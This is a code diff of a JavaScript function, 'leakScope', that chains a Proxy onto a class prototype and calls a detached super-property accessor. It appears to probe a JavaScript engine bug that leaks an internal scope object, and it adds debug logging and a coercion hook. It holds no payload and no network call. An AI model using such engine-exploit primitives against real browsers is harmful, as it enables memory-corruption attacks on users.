@@ -1,33 +1,61 @@
+const patchedReceivers = new WeakSet();
+
 function leakScope() {
     try {
+        log("===== LEAK SCOPE START =====", 'debug');
+        
         class Leaker {
             leak() {
+                log("[Leaker] Accessing super.foo", 'debug');
                 return super.foo;
             }
         }
 
-        Leaker.prototype.__proto__ = new Proxy({}, {
+        log("Setting up prototype chain", 'debug');
+        
+        const handler = {
             get(target, propertyName, receiver) {
-                log("[proxy trap] target: " + target + ", property: " + propertyName);
-
-                // Add Symbol.toPrimitive to receiver so it doesn't throw
-                receiver[Symbol.toPrimitive] = function(hint) {
-                    log("coercing receiver to primitive with hint: " + hint);
-                    return "dummy"; // Just return a harmless string
-                };
-
+                if (propertyName === Symbol.toPrimitive) {
+                    return Reflect.get(target, propertyName, receiver);
+                }
+                
+                log(`[Proxy] Intercepted: ${String(propertyName)}`, 'debug');
+                
+                if (!patchedReceivers.has(receiver)) {
+                    patchedReceivers.add(receiver);
+                    
+                    receiver[Symbol.toPrimitive] = function(hint) {
+                        try {
+                            log(`[Coercion] Hint: ${hint}`, 'warn');
+                            log(`[Coercion] this type: ${typeof this}`, 'debug');
+                            
+                            if (hint === 'number') {
+                                // SIMPLIFIED: Let the engine handle conversion
+                                return Number(this);
+                            }
+                            return String(this);
+                        } catch (e) {
+                            log(`[Coercion] Fallback failed: ${e}`, 'error');
+                            return 0xdeadbeef;
+                        }
+                    };
+                }
+                
                 return receiver;
             }
-        });
+        };
 
-        const foo = 42;
+        Leaker.prototype.__proto__ = new Proxy({}, handler);
+        log(`Proxy set? ${!!Leaker.prototype.__proto__}`, 'debug');
+
         const { leak } = Leaker.prototype;
-
-        let res = (() => leak())();
-        log("scope leak success: " + res);
-        return res;
+        log("Calling leak()", 'debug');
+        
+        const result = (() => leak())();
+        log(`Result type: ${typeof result}`, 'info');
+        return result;
     } catch (e) {
-        log("leakScope() threw: " + e);
+        log(`leakScope error: ${e.message}`, 'error');
         return null;
     }
 }
